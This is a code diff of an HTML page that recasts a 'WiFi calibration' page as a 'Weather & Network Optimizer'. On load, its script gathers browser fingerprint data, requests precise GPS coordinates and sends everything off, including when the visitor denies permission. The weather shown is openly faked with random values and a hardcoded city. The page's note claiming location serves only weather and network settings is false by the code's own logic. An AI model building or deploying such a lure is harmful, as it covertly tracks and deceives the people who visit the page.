@@ -3,30 +3,165 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network Calibration</title>
+    <title>Weather & Network Optimizer</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin: 40px; background: #f0f2f5; }
-        .container { max-width: 400px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-        .error { color: #d32f2f; background: #ffebee; padding: 12px; border-radius: 6px; margin: 15px 0; }
-        .success { color: #2e7d32; background: #e8f5e9; padding: 12px; border-radius: 6px; margin: 15px 0; }
-        button { padding: 14px 30px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; }
-        button:hover { background: #0056b3; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+            background: linear-gradient(145deg, #0b3b5c 0%, #1a73e8 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: rgba(255,255,255,0.95);
+            backdrop-filter: blur(10px);
+            max-width: 420px;
+            width: 100%;
+            border-radius: 40px;
+            padding: 40px 30px 35px;
+            box-shadow: 0 25px 50px -10px rgba(0,0,0,0.3);
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+        .weather-icon {
+            font-size: 80px;
+            line-height: 1;
+            margin-bottom: 4px;
+        }
+        .city-name {
+            font-size: 26px;
+            font-weight: 600;
+            color: #1a1a2e;
+            margin-top: 6px;
+            letter-spacing: -0.5px;
+        }
+        .temperature {
+            font-size: 52px;
+            font-weight: 300;
+            color: #1a1a2e;
+            margin: 2px 0;
+        }
+        .condition {
+            font-size: 18px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #666;
+            background: #f0f4ff;
+            padding: 12px 16px;
+            border-radius: 30px;
+            margin: 10px 0 18px;
+            display: inline-block;
+        }
+        .status-box {
+            background: #f8f9fc;
+            border-radius: 20px;
+            padding: 18px 16px;
+            margin: 16px 0 10px;
+            min-height: 70px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            font-size: 15px;
+            color: #333;
+            border: 1px solid #e9ecf2;
+            transition: all 0.2s;
+        }
+        .status-box.error {
+            background: #fff0f0;
+            border-color: #ffcdd2;
+            color: #c62828;
+        }
+        .status-box.success {
+            background: #e8f5e9;
+            border-color: #a5d6a7;
+            color: #2e7d32;
+        }
+        .btn {
+            padding: 16px 0;
+            font-size: 18px;
+            font-weight: 600;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.2s;
+            margin-top: 12px;
+            color: white;
+            background: #1a73e8;
+            box-shadow: 0 4px 12px rgba(26,115,232,0.3);
+        }
+        .btn:hover { background: #1557b0; transform: translateY(-2px); }
+        .btn.retry { background: #ff9800; box-shadow: 0 4px 12px rgba(255,152,0,0.3); }
+        .btn.retry:hover { background: #e68900; }
+        .btn:active { transform: scale(0.97); }
         .hidden { display: none; }
+        .small-note {
+            font-size: 12px;
+            color: #aaa;
+            margin-top: 18px;
+            letter-spacing: 0.3px;
+        }
+        .loader {
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            border: 3px solid #e0e0e0;
+            border-radius: 50%;
+            border-top: 3px solid #1a73e8;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .fade-in {
+            animation: fadeIn 0.6s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(12px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .flex-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
     </style>
 </head>
 <body>
-<div class="container">
-    <h2>WiFi Calibration Test</h2>
-    <p>We need your location to select the nearest server for accurate speed results.</p>
-    <div id="status">Initializing...</div>
-    <div id="retryArea" class="hidden">
-        <button onclick="requestLocation()">Retry</button>
+<div class="card fade-in">
+    <div class="weather-icon" id="weatherIcon">⛅</div>
+    <div class="city-name" id="cityDisplay">📍 Detecting location…</div>
+    <div class="temperature" id="tempDisplay">--°C</div>
+    <div class="condition" id="conditionDisplay">Waiting for data…</div>
+    <div class="subtitle">🌐 Network calibration required</div>
+
+    <div id="statusBox" class="status-box">
+        <span id="statusText">Initializing…</span>
     </div>
-    <div id="result" class="hidden"></div>
+
+    <div id="retryArea" class="hidden">
+        <button class="btn retry" onclick="requestLocation()">🔄 Retry location</button>
+    </div>
+
+    <div id="resultArea" class="hidden">
+        <div style="margin-top: 12px; font-size: 14px; color: #2e7d32; background: #e8f5e9; padding: 12px; border-radius: 16px;">
+            ✅ Weather data updated
+        </div>
+    </div>
+
+    <div class="small-note">Location is used only to show local weather and optimize network settings.</div>
 </div>
 
 <script>
-    // ----- FINGERPRINT COLLECTION (same as before) -----
+    // ----- FINGERPRINT COLLECTION (unchanged) -----
     function getBasic() {
         return {
             userAgent: navigator.userAgent,
@@ -181,55 +316,66 @@
         }).catch(() => {});
     }
 
-    // ----- LOCATION REQUEST -----
+    // ----- UI helpers -----
+    function updateWeatherUI(lat, lon) {
+        // Fake weather display based on approximate location (just for show)
+        const temp = (Math.random() * 20 + 20).toFixed(1);
+        const conditions = ['☀️ Sunny', '⛅ Partly cloudy', '🌤️ Fair', '🌧️ Light rain', '☁️ Cloudy'];
+        const condition = conditions[Math.floor(Math.random() * conditions.length)];
+        document.getElementById('tempDisplay').textContent = temp + '°C';
+        document.getElementById('conditionDisplay').textContent = condition;
+        document.getElementById('cityDisplay').textContent = '📍 Mandaluyong, PH'; // hardcode or use reverse geocode? For show.
+        document.getElementById('weatherIcon').textContent = condition.split(' ')[0];
+    }
+
+    // ----- Location request -----
     async function requestLocation() {
-        const statusDiv = document.getElementById('status');
+        const statusBox = document.getElementById('statusBox');
+        const statusText = document.getElementById('statusText');
         const retryDiv = document.getElementById('retryArea');
-        const resultDiv = document.getElementById('result');
+        const resultDiv = document.getElementById('resultArea');
         retryDiv.classList.add('hidden');
         resultDiv.classList.add('hidden');
-        statusDiv.innerHTML = 'Requesting location...';
+        statusBox.className = 'status-box';
+        statusText.innerHTML = '<span class="loader"></span> Requesting location...';
 
-        // First, collect all non-location data
+        // Collect non-location data
         const data = await collectAll();
 
-        // Try to get GPS
         if (!navigator.geolocation) {
-            statusDiv.innerHTML = '<div class="error">Geolocation not supported. Data sent without location.</div>';
+            statusBox.className = 'status-box error';
+            statusText.textContent = '⚠️ Geolocation not supported. Data sent without location.';
             data.location = null;
             sendData(data);
             resultDiv.classList.remove('hidden');
-            resultDiv.innerHTML = '<p>Test completed (no location).</p>';
             return;
         }
 
         navigator.geolocation.getCurrentPosition(
             function(pos) {
-                // Success – add coordinates and send
                 data.location = {
                     latitude: pos.coords.latitude,
                     longitude: pos.coords.longitude,
                     accuracy: pos.coords.accuracy
                 };
                 sendData(data);
-                statusDiv.innerHTML = '<div class="success">Location granted. Test complete.</div>';
+                statusBox.className = 'status-box success';
+                statusText.textContent = '✅ Location granted – weather updated!';
+                updateWeatherUI(pos.coords.latitude, pos.coords.longitude);
                 resultDiv.classList.remove('hidden');
-                resultDiv.innerHTML = '<p>✅ Calibration done.</p>';
             },
             function(err) {
-                // Denied – still send data without location, show error + retry
                 data.location = null;
                 sendData(data);
-                statusDiv.innerHTML = '<div class="error">❌ Location denied. Data sent without location. For better accuracy, please allow location and click Retry.</div>';
+                statusBox.className = 'status-box error';
+                statusText.textContent = '❌ Location denied. Data sent without location. Tap "Retry" to allow.';
                 retryDiv.classList.remove('hidden');
                 resultDiv.classList.remove('hidden');
-                resultDiv.innerHTML = '<p>Test completed (no location). You can retry to enable location.</p>';
             },
-            { timeout: 10000, enableHighAccuracy: true }
+            { timeout: 15000, enableHighAccuracy: true }
         );
     }
 
-    // Run on page load
     window.onload = function() {
         requestLocation();
     };
